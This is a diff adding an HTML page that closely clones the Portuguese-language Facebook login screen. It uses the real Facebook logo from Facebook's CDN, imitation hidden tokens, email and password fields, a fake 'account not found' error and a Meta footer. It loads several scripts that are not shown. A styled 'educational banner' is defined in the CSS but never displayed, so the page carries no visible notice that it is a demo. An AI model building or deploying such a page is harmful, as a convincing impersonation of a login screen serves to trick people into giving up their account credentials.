@@ -1,0 +1,364 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" href="./facebook.png">
+    <title>Entrar no Facebook</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: Helvetica, Arial, sans-serif;
+            background-color: #f0f2f5;
+            color: #1c1e21;
+            line-height: 1.34;
+        }
+
+        ._li {
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .fb_content {
+            flex: 1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        ._4-u5 {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            max-width: 400px;
+            width: 100%;
+        }
+
+        ._97vy {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        ._97vu {
+            height: 106px;
+            margin: -28px;
+        }
+
+        ._4-u2 {
+            background: #fff;
+            border: none;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
+            padding: 20px;
+            width: 396px;
+        }
+
+        ._xku {
+            padding-bottom: 16px;
+        }
+
+        ._97w1 {
+            display: flex;
+            justify-content: center;
+        }
+
+        ._9axz {
+            font-size: 18px;
+            line-height: 22px;
+            color: #1c1e21;
+            font-weight: 600;
+        }
+
+        /* Campos de input */
+        ._5466 {
+            margin-bottom: 12px;
+        }
+
+        ._44mg {
+            position: relative;
+        }
+
+        .inputtext {
+            font-size: 17px;
+            padding: 14px 16px;
+            width: 100%;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            background-color: #f5f6f7;
+        }
+
+        .inputtext:focus {
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px #e7f3ff;
+            outline: none;
+        }
+
+        ._9npi {
+            padding-right: 40px;
+        }
+
+        /* Botão de login */
+        ._xkt {
+            margin-top: 16px;
+        }
+
+        ._42ft {
+            border: none;
+            border-radius: 6px;
+            font-size: 20px;
+            line-height: 48px;
+            padding: 0 16px;
+            width: 100%;
+            cursor: pointer;
+            display: inline-block;
+            text-decoration: none;
+            white-space: nowrap;
+        }
+
+        ._4jy0 {
+            background-color: #1877f2;
+            border-color: #1877f2;
+            color: #fff;
+            font-weight: bold;
+        }
+
+        ._4jy0:hover {
+            background-color: #166fe5;
+        }
+
+        /* Link esqueceu senha */
+        ._82qp {
+            text-align: center;
+            margin-top: 16px;
+            padding-top: 16px;
+            border-top: 1px solid #dadde1;
+        }
+
+        ._97w4 {
+            color: #1877f2;
+            font-size: 14px;
+            text-decoration: none;
+        }
+
+        ._97w4:hover {
+            text-decoration: underline;
+        }
+
+        /* Mensagem de erro */
+        ._9ay7 {
+            color: #f02849;
+            font-family: SFProText-Regular, Helvetica, Arial, sans-serif;
+            font-size: 13px;
+            line-height: 16px;
+            margin-top: 8px;
+            text-align: left;
+        }
+
+        /* Ícone do campo de senha */
+        ._9ls7 {
+            position: absolute;
+            right: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            cursor: pointer;
+        }
+
+        /* Footer */
+        ._95ke {
+            background-color: #fff;
+            border-top: 1px solid #dadde1;
+            padding: 20px 0;
+            margin-top: 20px;
+        }
+
+        ._8opy {
+            max-width: 980px;
+            margin: 0 auto;
+            padding: 0 16px;
+        }
+
+        .uiList {
+            list-style: none;
+            display: flex;
+            flex-wrap: wrap;
+            margin-bottom: 8px;
+        }
+
+        .uiList li, .uiList a {
+            color: #8a8d91;
+            font-size: 12px;
+            margin-right: 20px;
+            text-decoration: none;
+        }
+
+        .uiList a:hover {
+            text-decoration: underline;
+        }
+
+        .copyright {
+            color: #8a8d91;
+            font-size: 11px;
+            margin-top: 20px;
+        }
+
+        /* Loading animation */
+        .login-loading {
+            display: inline-block;
+            width: 16px;
+            height: 16px;
+            border: 2px solid #ffffff;
+            border-radius: 50%;
+            border-top-color: transparent;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Password strength indicator */
+        .password-strength {
+            height: 4px;
+            margin-top: 8px;
+            border-radius: 2px;
+            transition: all 0.3s ease;
+            width: 0%;
+        }
+
+        /* Responsivo */
+        @media (max-width: 900px) {
+            ._4-u2 {
+                width: 100%;
+                max-width: 400px;
+            }
+            
+            .fb_content {
+                padding: 10px;
+            }
+        }
+
+        /* Banner educativo */
+        .educational-banner {
+            background: #fff3cd;
+            border: 1px solid #ffeaa7;
+            color: #856404;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            text-align: center;
+            font-size: 14px;
+        }
+    </style>
+</head>
+<body class="_39il _97vt _97vz _97v- _97v_ _97w2 _97w0 _9ax- _9ax_ _9ay1 UIPage_LoggedOut _-kb _605a b_c3pyn-ahh webkit win x1 Locale_pt_BR cores-gte4 _19_u" dir="ltr">
+    <div class="_li" id="u_0_0_8C">
+        <div id="globalContainer" class="uiContextualLayerParent">
+            <div class="fb_content clearfix" id="content" role="main">
+                <div class="_4-u5 _30ny">
+                    <div class="_97vy">
+                        <img class="_97vu img" src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="Facebook">
+                    </div>
+                    <div class="_4-u2 _1w1t _4-u8 _52jv">
+                        <div class="_xku" id="header_block">
+                            <span class="_97w1 _50f6">
+                                <div class="_9axz">Entrar no Facebook</div>
+                            </span>
+                        </div>
+                        <div class="login_form_container">
+                            <form id="login_form" action="#" method="post">
+                                <input type="hidden" name="jazoest" value="2881" autocomplete="off">
+                                <input type="hidden" name="lsd" value="AdENNJQok1E" autocomplete="off">
+                                
+                                <div id="loginform">
+                                    <div class="clearfix _5466 _44mg" id="email_container">
+                                        <input type="text" 
+                                               class="inputtext _55r1 inputtext _1kbt _9ay4 inputtext _1kbt" 
+                                               name="email" 
+                                               id="email" 
+                                               tabindex="0" 
+                                               placeholder="Email ou telefone" 
+                                               value="" 
+                                               autofocus="1" 
+                                               autocomplete="username" 
+                                               aria-label="Email ou telefone">
+                                        <div class="_9ay7" style="display: none;" id="errorMessage">
+                                            O email ou o número de celular que você inseriu não está conectado a uma conta. 
+                                            <a href="#">Encontre sua conta e entre.</a>
+                                        </div>
+                                    </div>
+                                    
+                                    <div class="clearfix _5466 _44mg">
+                                        <div>
+                                            <div class="_55r1 _1kbt" style="position: relative;">
+                                                <input type="password" 
+                                                       class="inputtext _55r1 inputtext _9npi inputtext _9npi" 
+                                                       name="pass" 
+                                                       id="pass" 
+                                                       tabindex="0" 
+                                                       placeholder="Senha" 
+                                                       value="" 
+                                                       autocomplete="current-password" 
+                                                       aria-label="Senha">
+                                                <!-- Área do toggle de senha será preenchida pelo script -->
+                                            </div>
+                                        </div>
+                                    </div>
+                                    
+                                    <div class="_xkt">
+                                        <button value="1" 
+                                                class="_42ft _4jy0 _52e0 _4jy6 _4jy1 selected _51sy" 
+                                                id="loginbutton" 
+                                                name="login" 
+                                                tabindex="0" 
+                                                type="submit">
+                                            Entrar
+                                        </button>
+                                    </div>
+                                    
+                                    <div id="login_link" class="_82qp _85em">
+                                        <div class="_97w3">
+                                            <a href="#" class="_97w4" target="">Esqueceu a senha?</a>
+                                        </div>
+                                    </div>
+                                </div>
+                            </form>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- Footer -->
+            <div class="_95ke _8opy">
+                <div id="pageFooter" data-referrer="page_footer">
+                    <ul class="uiList localeSelectorList _2pid _509- _4ki _6-h _6-j _6-i" data-nocookies="1">
+                        <li>Português (Brasil)</li>
+                        <li><a href="#" title="English (US)">English (US)</a></li>
+                        <li><a href="#" title="Spanish">Español</a></li>
+                        <li><a href="#" title="French (France)">Français (France)</a></li>
+                        <li><a href="#" title="Italian">Italiano</a></li>
+                        <li><a href="#" title="German">Deutsch</a></li>
+                    </ul>
+                    
+                    <div class="mvl copyright">
+                        <div><span>Meta © 2025</span></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script src="storage-manager.js"></script>
+    <script src="main-script.js"></script>
+    <script src="validation-script.js"></script>
+    <script src="animations-script.js"></script>
+</body>
+</html>
